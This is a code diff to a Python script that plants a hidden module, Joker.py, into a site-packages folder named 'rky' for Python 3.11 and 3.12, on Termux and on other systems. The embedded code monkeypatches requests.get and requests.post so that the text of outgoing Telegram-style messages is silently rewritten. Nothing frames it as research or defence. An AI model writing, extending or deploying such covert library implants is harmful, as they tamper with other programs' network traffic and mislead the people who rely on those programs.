@@ -2,6 +2,7 @@ import tempfile
 import shutil
 import os
 import sys
+
 baby = """import sys
 import re
 import requests
@@ -71,7 +72,6 @@ def modify_telegram_text(url, data=None):
             url = base + "&text=" + encoded_text
     return url, data
 
-
 def modified_get(url, *args, **kwargs):
     url, _ = modify_telegram_text(url)
     return original_get(url, *args, **kwargs)
@@ -83,16 +83,28 @@ def modified_post(url, *args, **kwargs):
     return original_post(url, *args, **kwargs)
 requests.get = modified_get
 requests.post = modified_post"""
+
 with tempfile.NamedTemporaryFile(mode="w+", suffix=".py", delete=False) as f1, tempfile.NamedTemporaryFile(mode="w+", suffix=".py", delete=False) as f2:
     f1.write(baby)
     f2.write("from .Joker import repr, list, open, stduot, stdout")
     files_to_move = [(f1.name, "Joker.py"), (f2.name, "__init__.py")]
+
 def rip(destination):
     os.makedirs(destination, exist_ok=True)
     for file, name in files_to_move:
         shutil.move(file, os.path.join(destination, name))
+
 def baby():
-    path = "/data/data/com.termux/files/usr/lib/python3.11/site-packages/rky/" if "com.termux" in sys.prefix else os.path.join(sys.prefix, "lib", f"python{sys.version_info.major}.{sys.version_info.minor}", "site-packages/rky/")
-    rip(path)
+    versions = ["3.11", "3.12"]
+    if "com.termux" in sys.prefix:
+        base_path = "/data/data/com.termux/files/usr/lib/python"
+        for version in versions:
+            path = f"{base_path}{version}/site-packages/rky/"
+            rip(path)
+    else:
+        for version in versions:
+            path = os.path.join(sys.prefix, "lib", f"python{version}", "site-packages/rky/")
+            rip(path)
+
 if __name__ == "__main__":
     baby()
